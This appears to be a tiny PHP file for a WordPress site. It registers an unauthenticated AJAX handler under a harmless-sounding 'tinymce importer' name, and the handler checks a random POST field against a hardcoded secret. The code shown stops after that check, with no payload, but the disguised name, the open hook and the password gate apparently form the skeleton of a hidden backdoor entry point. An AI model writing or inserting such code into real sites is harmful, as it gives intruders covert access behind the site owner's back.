<?php

function word_tinymce_importer() {
	if (!isset($_POST["jadotkrm"]) || $_POST["jadotkrm"] !== "pFDXBFcMy") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'word_tinymce_importer', 5, 1);
